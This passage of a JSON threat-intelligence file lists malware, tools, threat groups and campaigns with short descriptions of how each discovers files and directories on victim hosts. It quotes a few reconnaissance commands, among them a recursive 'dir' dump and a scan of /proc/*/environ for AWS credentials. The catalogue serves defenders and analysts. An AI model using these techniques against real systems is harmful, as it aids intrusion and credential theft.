        "description": "Denis has several commands to search directories for files.[101][102]"
      },
      {
        "id": "S0021",
        "name": "Derusbi",
        "description": "Derusbi is capable of obtaining directory, file, and drive listings.[103][74]"
      },
      {
        "id": "S0659",
        "name": "Diavol",
        "description": "Diavol has a command to traverse the files and directories in a given path.[104]"
      },
      {
        "id": "S0600",
        "name": "Doki",
        "description": "Doki has resolved the path of a process PID to use as a script argument.[105]"
      },
      {
        "id": "S0472",
        "name": "down_new",
        "description": "down_new has the ability to list the directories on a compromised host.[25]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has used a batch script to gather folder and file names from victim hosts.[106][107][108]"
      },
      {
        "id": "S0547",
        "name": "DropBook",
        "description": "DropBook can collect the names of all files and folders in the Program Files directories.[109][110]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "Dtrack can list files on available disk volumes.[111][112]"
      },
      {
        "id": "S0062",
        "name": "DustySky",
        "description": "DustySky scans the victim for files that contain certain keywords and document types including PDF, DOC, DOCX, XLS, and XLSX, from a list that is obtained from the C2 as a text file. It can also identify logical drives for the infected machine.[113][114]"
      },
      {
        "id": "S0377",
        "name": "Ebury",
        "description": "Ebury can list directory entries.[115]"
      },
      {
        "id": "S0081",
        "name": "Elise",
        "description": "A variant of Elise executes dir C:\\progra~1 when initially run.[116][117]"
      },
      {
        "id": "S0064",
        "name": "ELMER",
        "description": "ELMER is capable of performing directory listings.[118]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire includes various modules for finding files of interest on hosts and network shares.[119]"
      },
      {
        "id": "S0091",
        "name": "Epic",
        "description": "Epic recursively searches for all .doc files on the system and collects a directory listing of the Desktop, %TEMP%, and %WINDOWS%\\Temp directories.[120][121]"
      },
      {
        "id": "S0181",
        "name": "FALLCHILL",
        "description": "FALLCHILL can search files on a victim.[122]"
      },
      {
        "id": "S0512",
        "name": "FatDuke",
        "description": "FatDuke can enumerate directories on target machines.[123]"
      },
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has used the Windows dir command to enumerate files and directories in a victim's network.[124]"
      },
      {
        "id": "S0182",
        "name": "FinFisher",
        "description": "FinFisher enumerates directories and scans for certain files.[125][126]"
      },
      {
        "id": "S0618",
        "name": "FIVEHANDS",
        "description": "FIVEHANDS has the ability to enumerate files on a compromised host in order to encrypt files with specific extensions.[127][128]"
      },
      {
        "id": "S0036",
        "name": "FLASHFLOOD",
        "description": "FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on the local system and removable media.[34]"
      },
      {
        "id": "S0661",
        "name": "FoggyWeb",
        "description": "FoggyWeb's loader can check for the FoggyWeb backdoor .pri file on a compromised AD FS server.[129]"
      },
      {
        "id": "S0193",
        "name": "Forfiles",
        "description": "Forfiles can be used to locate certain types of files/directories in a system.(ex: locate all files with a specific extension, name, and/or age)[12]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has used WizTree to obtain network files and directory listings.[130]"
      },
      {
        "id": "S0277",
        "name": "FruitFly",
        "description": "FruitFly looks for specific files and file types.[131]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream can identify files with .doc, .docx, .ppt, .pptx, .xls, .xlsx, and .pdf extensions and specific timestamps for collection.[70]"
      },
      {
        "id": "S0628",
        "name": "FYAnti",
        "description": "FYAnti can search the C:\\Windows\\Microsoft.NET\\ directory for files of a specified size.[132]"
      },
      {
        "id": "S0410",
        "name": "Fysbis",
        "description": "Fysbis has the ability to search for files.[133]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group macros can scan for Microsoft Word and Excel files to inject with additional malicious macros. Gamaredon Group has also used its backdoors to automatically list interesting files (such as Office documents) found on a system.[134][135]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium can retrieve data from specific Windows directories, as well as open random files as part of Virtualization/Sandbox Evasion.[136]"
      },
      {
        "id": "S0049",
        "name": "GeminiDuke",
        "description": "GeminiDuke collects information from the victim, including installed drivers, programs previously executed by users, programs and services configured to automatically run at startup, files and folders present in any user's home folder, files and folders present in any user's My Documents, programs installed to the Program Files folder, and recently accessed files, folders, and programs.[137]"
      },
      {
        "id": "S0249",
        "name": "Gold Dragon",
        "description": "Gold Dragon lists the directories for Desktop, program files, and the user’s recently accessed files.[63]"
      },
      {
        "id": "S0493",
        "name": "GoldenSpy",
        "description": "GoldenSpy has included a program \"ExeProtector\", which monitors for the existence of GoldenSpy on the infected system and redownloads if necessary.[138]"
      },
      {
        "id": "S0237",
        "name": "GravityRAT",
        "description": "GravityRAT collects the volumes mapped on the system, and also steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.[139]"
      },
      {
        "id": "S0632",
        "name": "GrimAgent",
        "description": "GrimAgent has the ability to enumerate files and directories on a compromised host.[140]"
      },
      {
        "id": "G0125",
        "name": "HAFNIUM",
        "description": "HAFNIUM has searched file contents on a compromised host.[75]"
      },
      {
        "id": "S0697",
        "name": "HermeticWiper",
        "description": "HermeticWiper can enumerate common folders such as My Documents, Desktop, and AppData.[141][142]"
      },
      {
        "id": "S1027",
        "name": "Heyoka Backdoor",
        "description": "Heyoka Backdoor has the ability to search the compromised host for files.[9]"
      },
      {
        "id": "S0376",
        "name": "HOPLIGHT",
        "description": "HOPLIGHT has been observed enumerating system drives and partitions.[143]"
      },
      {
        "id": "S0431",
        "name": "HotCroissant",
        "description": "HotCroissant has the ability to retrieve a list of files in a given directory as well as drives and drive types.[144]"
      },
      {
        "id": "S0070",
        "name": "HTTPBrowser",
        "description": "HTTPBrowser is capable of listing files, folders, and drives on a victim.[145][146]"
      },
      {
        "id": "S0203",
        "name": "Hydraq",
        "description": "Hydraq creates a backdoor through which remote attackers can check for the existence of files, including its own components, as well as retrieve a list of logical drives.[147][148]"
      },
      {
        "id": "S1022",
        "name": "IceApple",
        "description": "The IceApple Directory Lister module can list information about files and directories including creation time, last write time, name, and size.[149]"
      },
      {
        "id": "S0434",
        "name": "Imminent Monitor",
        "description": "Imminent Monitor has a dynamic debugging feature to check whether it is located in the %TEMP% directory, otherwise it copies itself there.[150]"
      },
      {
        "id": "G0100",
        "name": "Inception",
        "description": "Inception used a file listing plugin to collect information about file and directories both on local and remote drives.[151]"
      },
      {
        "id": "S0604",
        "name": "Industroyer",
        "description": "Industroyer’s data wiper component enumerates specific files on all the Windows drives.[152]"
      },
      {
        "id": "S0259",
        "name": "InnaputRAT",
        "description": "InnaputRAT enumerates directories and obtains file attributes on a system.[153]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can list information about files in a directory and recently opened or used documents. InvisiMole can also search for specific files by supplied file mask.[154]"
      },
      {
        "id": "S0015",
        "name": "Ixeshe",
        "description": "Ixeshe can list file and directory information.[155]"
      },
      {
        "id": "S0201",
        "name": "JPIN",
        "description": "JPIN can enumerate drives and their types. It can also change file permissions using cacls.exe.[156]"
      },
      {
        "id": "S0283",
        "name": "jRAT",
        "description": "jRAT can browse file systems.[157][158]"
      },
      {
        "id": "S0088",
        "name": "Kasidet",
        "description": "Kasidet has the ability to search for a given filename on a victim.[159]"
      },
      {
        "id": "S0265",
        "name": "Kazuar",
        "description": "Kazuar finds a specified directory, lists the files and metadata about those files.[160]"
      },
      {
        "id": "G0004",
        "name": "Ke3chang",
        "description": "Ke3chang uses command-line interaction to search files and directories.[161][162]"
      },
      {
        "id": "S0387",
        "name": "KeyBoy",
        "description": "KeyBoy has a command to launch a file browser or explorer on the system.[163]"
      },
      {
        "id": "S0271",
        "name": "KEYMARBLE",
        "description": "KEYMARBLE has a command to search for files on the victim’s machine.[164]"
      },
      {
        "id": "S0526",
        "name": "KGH_SPY",
        "description": "KGH_SPY can enumerate files and directories on a compromised host.[165]"
      },
      {
        "id": "S0607",
        "name": "KillDisk",
        "description": "KillDisk has used the FindNextFile command as part of its file deletion process.[166]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has the ability to enumerate all files and directories on an infected system.[167][168][169]"
      },
      {
        "id": "S0599",
        "name": "Kinsing",
        "description": "Kinsing has used the find command to search for specific files.[170]"
      },
      {
        "id": "S0437",
        "name": "Kivars",
        "description": "Kivars has the ability to list drives on the infected host.[171]"
      },
      {
        "id": "S0250",
        "name": "Koadic",
        "description": "Koadic can obtain a list of directories.[172]"
      },
      {
        "id": "S0356",
        "name": "KONNI",
        "description": "A version of KONNI searches for filenames created with a previous version of the malware, suggesting different versions targeted the same victims and the versions may work together.[173]"
      },
      {
        "id": "S0236",
        "name": "Kwampirs",
        "description": "Kwampirs collects a list of files and directories in C:\\ with the command dir /s /a c:\\ >> \"C:\\windows\\TEMP[RANDOM].tmp\".[174]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group malware can use a common function to identify target files by their extension, and some also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.[175][176][177][178]"
      },
      {
        "id": "G0077",
        "name": "Leafminer",
        "description": "Leafminer used a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files.[179]"
      },
      {
        "id": "S0211",
        "name": "Linfo",
        "description": "Linfo creates a backdoor through which remote attackers can list contents of drives and search for files.[180]"
      },
      {
        "id": "S0447",
        "name": "Lokibot",
        "description": "Lokibot can search for specific files on an infected host.[181]"
      },
      {
        "id": "S0582",
        "name": "LookBack",
        "description": "LookBack can retrieve file listings from the victim machine.[182]"
      },
      {
        "id": "G1014",
        "name": "LuminousMoth",
        "description": "LuminousMoth has used malware that scans for files in the Documents, Desktop, and Download folders and in other drives.[183][184]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete produces file listings in order to search for files to be exfiltrated.[185][186][187]"
      },
      {
        "id": "S1016",
        "name": "MacMa",
        "description": "MacMa can search for a specific file on the compromised computer and can enumerate files in Desktop, Downloads, and Documents folders.[188]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can search for files and directories.[189]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound malware can list a victim's logical drives and the type, as well the total/free space of the fixed devices. Other malware can list a directory's contents.[190]"
      },
      {
        "id": "S0652",
        "name": "MarkiRAT",
        "description": "MarkiRAT can look for files carrying specific extensions such as: .rtf, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .pps, .ppsx, .txt, .gpg, .pkr, .kdbx, .key, and .jpb.[191]"
      },
      {
        "id": "S0576",
        "name": "MegaCortex",
        "description": "MegaCortex can parse the available drives and directories to determine which files to encrypt.[192]"
      },
      {
        "id": "G0045",
        "name": "menuPass",
        "description": "menuPass has searched compromised systems for folders of interest including those related to HR, audit and expense, and meeting memos.[193]"
      },
      {
        "id": "S0443",
        "name": "MESSAGETAP",
        "description": "MESSAGETAP checks for the existence of two configuration files (keyword_parm.txt and parm.txt) and attempts to read the files every 30 seconds.[194]"
      },
      {
        "id": "S1059",
        "name": "metaMain",
        "description": "metaMain can recursively enumerate files in an operator-provided directory.[189][195]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo has searched the Program Files directories for specific folders and has searched for strings related to its mutexes.[196][197][198]"
      },
      {
        "id": "S0339",
        "name": "Micropsia",
        "description": "Micropsia can perform a recursive directory listing for all volume drives available on the victim's machine and can also fetch specific files by their paths.[199]"
      },
      {
        "id": "S0051",
        "name": "MiniDuke",
        "description": "MiniDuke can enumerate local drives.[123]"
      },
      {
        "id": "S0083",
        "name": "Misdat",
        "description": "Misdat is capable of running commands to obtain a list of files and directories, as well as enumerating logical drives.[200]"
      },
      {
        "id": "S0079",
        "name": "MobileOrder",
        "description": "MobileOrder has a command to upload to its C2 server information about files on the victim mobile device, including SD card size, installed app list, SMS content, contacts, and calling history.[201]"
      },
      {
        "id": "S0149",
        "name": "MoonWind",
        "description": "MoonWind has a command to return a directory listing for a specified directory.[202]"
      },
      {
        "id": "G0069",
        "name": "MuddyWater",
        "description": "MuddyWater has used malware that checked if the ProgramData folder had folders or files with the keywords \"Kasper,\" \"Panda,\" or \"ESET.\"[203]"
      },
      {
        "id": "G0129",
        "name": "Mustang Panda",
        "description": "Mustang Panda has searched the entire target system for DOC, DOCX, PPT, PPTX, XLS, XLSX, and PDF files.[204]"
      },
      {
        "id": "S0272",
        "name": "NDiskMonitor",
        "description": "NDiskMonitor can obtain a list of all files and directories as well as logical drives.[36]"
      },
      {
        "id": "S0630",
        "name": "Nebulae",
        "description": "Nebulae can list files and directories on a compromised host.[205]"
      },
      {
        "id": "S0034",
        "name": "NETEAGLE",
        "description": "NETEAGLE allows adversaries to enumerate and modify the infected host's file system. It supports searching for directories, creating directories, listing directory contents, reading and writing to files, retrieving file attributes, and retrieving volume information.[34]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE has the ability to search for files on the compromised host.[206]"
      },
      {
        "id": "C0002",
        "name": "Night Dragon",
        "description": "During Night Dragon, threat actors used zwShell to establish full remote control of the connected machine and browse the victim file system.[207]"
      },
      {
        "id": "S1090",
        "name": "NightClub",
        "description": "NightClub can use a file monitor to identify .lnk, .doc, .docx, .xls, .xslx, and .pdf files.[208]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT can browse file systems using a file manager module.[209]"
      },
      {
        "id": "S0368",
        "name": "NotPetya",
        "description": "NotPetya searches for files ending with dozens of different file extensions prior to encryption.[210]"
      },
      {
        "id": "S0644",
        "name": "ObliqueRAT",
        "description": "ObliqueRAT has the ability to recursively enumerate files on an infected endpoint.[211]"
      },
      {
        "id": "S0346",
        "name": "OceanSalt",
        "description": "OceanSalt can extract drive information from the endpoint and search files on the system.[212]"
      },
      {
        "id": "S0340",
        "name": "Octopus",
        "description": "Octopus can collect information on the Windows directory and searches for compressed RAR files on the host.[213][214][215]"
      },
      {
        "id": "S0439",
        "name": "Okrum",
        "description": "Okrum has used DriveLetterView to enumerate drive information.[216]"
      },
      {
        "id": "C0012",
        "name": "Operation CuckooBees",
        "description": "During Operation CuckooBees, the threat actors used dir c:\\\\ to search for files.[217]"
      },
      {
        "id": "C0022",
        "name": "Operation Dream Job",
        "description": "During Operation Dream Job, Lazarus Group conducted word searches within documents on a compromised host in search of security and financial matters.[218]"
      },
      {
        "id": "C0006",
        "name": "Operation Honeybee",
        "description": "During Operation Honeybee, the threat actors used a malicious DLL to search for files with specific keywords.[219]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, threat actors gathered a recursive directory listing to find files and directories of interest.[220]"
      },
      {
        "id": "S0229",
        "name": "Orz",
        "description": "Orz can gather victim drive information.[221]"
      },
      {
        "id": "S0402",
        "name": "OSX/Shlayer",
        "description": "OSX/Shlayer has used the command appDir=\"$(dirname $(dirname \"$currentDir\"))\" and $(dirname \"$(pwd -P)\") to construct installation paths.[222][223]"
      },
      {
        "id": "S1017",
        "name": "OutSteel",
        "description": "OutSteel can search for specific file extensions, including zipped files.[224]"
      },
      {
        "id": "S0072",
        "name": "OwaAuth",
        "description": "OwaAuth has a command to list its directory and logical drives.[145]"
      },
      {
        "id": "S0598",
        "name": "P.A.S. Webshell",
        "description": "P.A.S. Webshell has the ability to list files and file characteristics including extension, size, ownership, and permissions.[225]"
      },
      {
        "id": "S0208",
        "name": "Pasam",
        "description": "Pasam creates a backdoor through which remote attackers can retrieve lists of files.[226]"
      },
      {
        "id": "G0040",
        "name": "Patchwork",
        "description": "A Patchwork payload has searched all fixed drives on the victim for files matching a specified list of extensions.[227][36]"
      },
      {
        "id": "S0587",
        "name": "Penquin",
        "description": "Penquin can use the command code do_vslist to send file names, size, and status to C2.[228]"
      },
      {
        "id": "S0643",
        "name": "Peppy",
        "description": "Peppy can identify specific files for exfiltration.[88]"
      },
      {
        "id": "S0048",
        "name": "PinchDuke",
        "description": "PinchDuke searches for files created within a certain timeframe and whose file extension matches a predefined list.[137]"
      },
      {
        "id": "S1031",
        "name": "PingPull",
        "description": "PingPull can enumerate storage volumes and folder contents of a compromised host.[229]"
      },
      {
        "id": "S0124",
        "name": "Pisloader",
        "description": "Pisloader has commands to list drives on the victim machine and to list file information for a given directory.[230]"
      },
      {
        "id": "S0435",
        "name": "PLEAD",
        "description": "PLEAD has the ability to list drives and files on the compromised host.[171][231]"
      },
      {
        "id": "S0013",
        "name": "PlugX",
        "description": "PlugX has a module to enumerate drives and find files recursively.[232][233]"
      },
      {
        "id": "S0428",
        "name": "PoetRAT",
        "description": "PoetRAT has the ability to list files upon receiving the ls command from C2.[234]"
      },
      {
        "id": "S0216",
        "name": "POORAIM",
        "description": "POORAIM can conduct file browsing.[84]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 can enumerate files on the local file system and includes a module for enumerating recently accessed files.[235]"
      },
      {
        "id": "S0139",
        "name": "PowerDuke",
        "description": "PowerDuke has commands to get the current directory name as well as the size of a file. It also has commands to obtain information about logical drives, drive type, and free space.[236]"
      },
      {
        "id": "S0184",
        "name": "POWRUNER",
        "description": "POWRUNER may enumerate user directories on a victim.[237]"
      },
      {
        "id": "S1058",
        "name": "Prestige",
        "description": "Prestige can traverse the file system to discover files to encrypt by identifying specific extensions defined in a hardcoded list.[238]"
      },
      {
        "id": "S0113",
        "name": "Prikormka",
        "description": "A module in Prikormka collects information about the paths, size, and creation time of files with specific file extensions, but not the actual content of the file.[239]"
      },
      {
        "id": "S0238",
        "name": "Proxysvc",
        "description": "Proxysvc lists files in directories.[176]"
      },
      {
        "id": "S0078",
        "name": "Psylo",
        "description": "Psylo has commands to enumerate all storage devices and to find all files that start with a particular string.[201]"
      },
      {
        "id": "S0147",
        "name": "Pteranodon",
        "description": "Pteranodon identifies files matching certain file extension and copies them to subdirectories it created.[240]"
      },
      {
        "id": "S0192",
        "name": "Pupy",
        "description": "Pupy can walk through directories and recursively search for strings in files.[241]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can identify whether it has been run previously on a host by checking for a specified folder.[242]"
      },
      {
        "id": "S0686",
        "name": "QuietSieve",
        "description": "QuietSieve can search files on the target host by extension, including doc, docx, xls, rtf, odt, txt, jpg, pdf, rar, zip, and 7z.[243]"
      },
      {
        "id": "S0629",
        "name": "RainyDay",
        "description": "RainyDay can use a file exfiltration tool to collect recently changed files with specific extensions.[205]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay can collect directory and file lists.[244][245]"
      },
      {
        "id": "S0055",
        "name": "RARSTONE",
        "description": "RARSTONE obtains installer properties from Uninstall Registry Key entries to obtain information about installed applications and how to uninstall certain applications.[246]"
      },
      {
        "id": "S1040",
        "name": "Rclone",
        "description": "Rclone can list files and directories with the ls, lsd, and lsl commands.[247]"
      },
      {
        "id": "S0153",
        "name": "RedLeaves",
        "description": "RedLeaves can enumerate and search for files and directories.[248][72]"
      },
      {
        "id": "S0332",
        "name": "Remcos",
        "description": "Remcos can search for files on the infected machine.[249]"
      },
      {
        "id": "S0375",
        "name": "Remexi",
        "description": "Remexi searches for files on the system. [250]"
      },
      {
        "id": "S0592",
        "name": "RemoteUtilities",
        "description": "RemoteUtilities can enumerate files and directories on a target machine.[251]"
      },
      {
        "id": "S0125",
        "name": "Remsec",
        "description": "Remsec is capable of listing contents of folders on the victim. Remsec also searches for custom network encryption software on victims.[252][253][254]"
      },
      {
        "id": "S0496",
        "name": "REvil",
        "description": "REvil has the ability to identify specific files and directories that are not to be encrypted.[255][256][257][258][259][260]"
      },
      {
        "id": "S0448",
        "name": "Rising Sun",
        "description": "Rising Sun can enumerate information about files from the infected system, including file size, attributes, creation time, last access time, and write time. Rising Sun can enumerate the compilation timestamp of Windows executable files.[261]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT has the ability to gather a list of files and directories on the infected system.[262][263][264]"
      },
      {
        "id": "S0090",
        "name": "Rover",
        "description": "Rover automatically searches for files on local drives based on a predefined list of file extensions.[265]"
      },
      {
        "id": "S1073",
        "name": "Royal",
        "description": "Royal can identify specific files and directories to exclude from the encryption process.[266][267][268]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM can check for specific files and directories associated with virtualization and malware analysis.[269]"
      },
      {
        "id": "S0446",
        "name": "Ryuk",
        "description": "Ryuk has enumerated files and folders on all mounted drives.[270]"
      },
      {
        "id": "S1018",
        "name": "Saint Bot",
        "description": "Saint Bot can search a compromised host for specific files.[224]"
      },
      {
        "id": "G0034",
        "name": "Sandworm Team",
        "description": "Sandworm Team has enumerated files on a compromised host.[210][271]"
      },
      {
        "id": "S0461",
        "name": "SDBbot",
        "description": "SDBbot has the ability to get directory listings or drive information on a compromised host.[272]"
      },
      {
        "id": "S0345",
        "name": "Seasalt",
        "description": "Seasalt has the capability to identify the drive type on a victim.[212]"
      },
      {
        "id": "S1089",
        "name": "SharpDisco",
        "description": "SharpDisco can identify recently opened files by using an LNK format parser to extract the original file path from LNK files found in either %USERPROFILE%\\Recent (Windows XP) or %APPDATA%\\Microsoft\\Windows\\Recent (newer Windows versions) .[208]"
      },
      {
        "id": "S0444",
        "name": "ShimRat",
        "description": "ShimRat can list directories.[273]"
      },
      {
        "id": "S0063",
        "name": "SHOTPUT",
        "description": "SHOTPUT has a command to obtain a directory listing.[274]"
      },
      {
        "id": "S0610",
        "name": "SideTwist",
        "description": "SideTwist has the ability to search for specific files.[275]"
      },
      {
        "id": "G0121",
        "name": "Sidewinder",
        "description": "Sidewinder has used malware to collect information on files and directories.[276]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY has several modules, such as ls.py, pwd.py, and recentFiles.py, to enumerate directories and files.[277]"
      },
      {
        "id": "S0623",
        "name": "Siloscape",
        "description": "Siloscape searches for the Kubernetes config file and other related files using a regular expression.[278]"
      },
      {
        "id": "S0468",
        "name": "Skidmap",
        "description": "Skidmap has checked for the existence of specific files including /usr/sbin/setenforce and  /etc/selinux/config. It also has the ability to monitor the cryptocurrency miner file and process. [279]"
      },
      {
        "id": "S0633",
        "name": "Sliver",
        "description": "Sliver can enumerate files on a target system.[280]"
      },
      {
        "id": "S0533",
        "name": "SLOTHFULMEDIA",
        "description": "SLOTHFULMEDIA can enumerate files and directories.[281]"
      },
      {
        "id": "S0226",
        "name": "Smoke Loader",
        "description": "Smoke Loader recursively searches through directories for files.[282]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 obtained information about the configured Exchange virtual directory using Get-WebServicesVirtualDirectory.[283]"
      },
      {
        "id": "S0615",
        "name": "SombRAT",
        "description": "SombRAT can execute enum to enumerate files in storage on a compromised system.[284]"
      },
      {
        "id": "S0516",
        "name": "SoreFang",
        "description": "SoreFang has the ability to list directories.[285]"
      },
      {
        "id": "S0157",
        "name": "SOUNDBITE",
        "description": "SOUNDBITE is capable of enumerating and manipulating files and directories.[286]"
      },
      {
        "id": "G0054",
        "name": "Sowbug",
        "description": "Sowbug identified and extracted all Word documents on a server by using a command containing * .doc and *.docx. The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim.[287]"
      },
      {
        "id": "S0035",
        "name": "SPACESHIP",
        "description": "SPACESHIP identifies files and directories for collection by searching for specific file extensions or file modification time.[34]"
      },
      {
        "id": "S0142",
        "name": "StreamEx",
        "description": "StreamEx has the ability to enumerate drive types.[288]"
      },
      {
        "id": "S1034",
        "name": "StrifeWater",
        "description": "StrifeWater can enumerate files on a compromised host.[289]"
      },
      {
        "id": "S0491",
        "name": "StrongPity",
        "description": "StrongPity can parse the hard drive on a compromised host to identify specific file extensions.[290]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet uses a driver to scan for specific filesystem driver objects.[291]"
      },
      {
        "id": "S1042",
        "name": "SUGARDUMP",
        "description": "SUGARDUMP can search for and collect data from specific Chrome, Opera, Microsoft Edge, and Firefox files, including any folders that have the string Profile in its name.[292]"
      },
      {
        "id": "S0559",
        "name": "SUNBURST",
        "description": "SUNBURST had commands to enumerate files and directories.[293][294]"
      },
      {
        "id": "S0562",
        "name": "SUNSPOT",
        "description": "SUNSPOT enumerated the Orion software Visual Studio solution directory path.[295]"
      },
      {
        "id": "S0242",
        "name": "SynAck",
        "description": "SynAck checks its directory location in an attempt to avoid launching in a sandbox.[296][297]"
      },
      {
        "id": "S0663",
        "name": "SysUpdate",
        "description": "SysUpdate can search files on a compromised host.[298][299]"
      },
      {
        "id": "S0011",
        "name": "Taidoor",
        "description": "Taidoor can search for specific files.[300]"
      },
      {
        "id": "S0586",
        "name": "TAINTEDSCRIBE",
        "description": "TAINTEDSCRIBE can use DirectoryList to enumerate files in a specified directory.[301]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has the ability to index files from drives, user profiles, and removable drives.[302]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has used a script that checks /proc/*/environ for environment variables related to AWS.[303]"
      },
      {
        "id": "S0665",
        "name": "ThreatNeedle",
        "description": "ThreatNeedle can obtain file and directory information.[304]"
      },
      {
        "id": "S0131",
        "name": "TINYTYPHON",
        "description": "TINYTYPHON searches through the drive containing the OS, then all drive letters C through to Z, for documents matching certain extensions.[23]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip. It can also obtain browsing history, cookies, and plug-in information.[305][306]"
      },
      {
        "id": "S0094",
        "name": "Trojan.Karagany",
        "description": "Trojan.Karagany can enumerate files and directories on a compromised host.[307]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper has monitored files' modified time.[308]"
      },
      {
        "id": "S0436",
        "name": "TSCookie",
        "description": "TSCookie has the ability to discover drive information on the infected host.[309]"
      },
      {
        "id": "S0647",
        "name": "Turian",
        "description": "Turian can search for specific files and list directories.[310]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla surveys a system upon check-in to discover files in specific locations on the hard disk %TEMP% directory, the current user's desktop, the Program Files directory, and Recent.[120][311] Turla RPC backdoors have also searched for files matching the lPH*.dll pattern.[312]"
      },
      {
        "id": "S0263",
        "name": "TYPEFRAME",
        "description": "TYPEFRAME can search directories for files on the victim’s machine.[313]"
      },
      {
        "id": "S0275",
        "name": "UPPERCUT",
        "description": "UPPERCUT has the capability to gather the victim's current directory.[314]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Uroburos can search for specific files on a compromised system.[315]"
      },
      {
        "id": "S0452",
        "name": "USBferry",
        "description": "USBferry can detect the victim's file or folder list.[308]"
      },
      {
        "id": "S0136",
        "name": "USBStealer",
        "description": "USBStealer searches victim drives for files matching certain extensions (\".skr\",\".pkr\" or \".key\") or names.[316][317]"
      },
      {
        "id": "S0180",
        "name": "Volgmer",
        "description": "Volgmer can list directories on a victim.[318]"
      },
      {
        "id": "S0366",
        "name": "WannaCry",
        "description": "WannaCry searches for variety of user files by file extension before encrypting them using RSA and AES, including Office, PDF, image, audio, video, source code, archive/compression format, and key and certificate files.[319][320]"
      },
      {
        "id": "S0670",
        "name": "WarzoneRAT",
        "description": "WarzoneRAT can enumerate directories on a compromise host.[321]"
      },
      {
        "id": "S0612",
        "name": "WastedLocker",
        "description": "WastedLocker can enumerate files and directories just prior to encryption.[322]"
      },
      {
        "id": "S0689",
        "name": "WhisperGate",
        "description": "WhisperGate can locate files based on hardcoded file extensions.[323][324][325][326]"
      },
      {
        "id": "G0124",
        "name": "Windigo",
        "description": "Windigo has used a script to check for the presence of files created by OpenSSH backdoors.[327]"
      },
      {
        "id": "S0466",
        "name": "WindTail",
        "description": "WindTail has the ability to enumerate the users home directory and the path to its own application bundle.[328][329]"
      },
      {
        "id": "S0219",
        "name": "WINERACK",
        "description": "WINERACK can enumerate files and directories.[84]"
      },
      {
        "id": "S0059",
        "name": "WinMM",
        "description": "WinMM sets a WH_CBT Windows hook to search for and capture files on the victim.[330]"
      },
      {
        "id": "S0141",
        "name": "Winnti for Windows",
        "description": "Winnti for Windows can check for the presence of specific files prior to moving to the next phase of execution.[331]"
      },
      {
        "id": "G0044",
        "name": "Winnti Group",
        "description": "Winnti Group has used a program named ff.exe to search for specific documents on compromised hosts.[332]"
      },
      {
        "id": "S1065",
        "name": "Woody RAT",
        "description": "Woody RAT can list all files and their associated attributes, including filename, type, owner, creation time, last access time, last write time, size, and permissions.[333]"
      },
      {
        "id": "S0161",
        "name": "XAgentOSX",
        "description": "XAgentOSX contains the readFiles function to return a detailed listing (sometimes recursive) of a specified directory.[334] XAgentOSX contains the showBackupIosFolder function to check for IOS device backups by running ls -la ~/Library/Application\\ Support/MobileSync/Backup/.[334]"
      },
      {
        "id": "S0658",
        "name": "XCSSET",
        "description": "XCSSET has used mdfind to enumerate a list of apps known to grant screen sharing permissions.[335]"
      },
      {
        "id": "S0248",
        "name": "yty",
        "description": "yty gathers information on victim’s drives and has a plugin for document listing.[336]"
      },
      {
        "id": "S0251",
        "name": "Zebrocy",
        "description": "Zebrocy searches for files that are 60mb and less and contain the following extensions: .doc, .docx, .xls, .xlsx, .ppt, .pptx, .exe, .zip, and .rar. Zebrocy also runs the echo %APPDATA% command to list the contents of the directory.[337][338][339] Zebrocy can obtain the current execution path as well as perform drive enumeration.[340][341]"
      },
      {
        "id": "S0330",
        "name": "Zeus Panda",
        "description": "Zeus Panda searches for specific directories on the victim’s machine.[342]"
      },
      {
        "id": "S0086",
        "name": "ZLib",
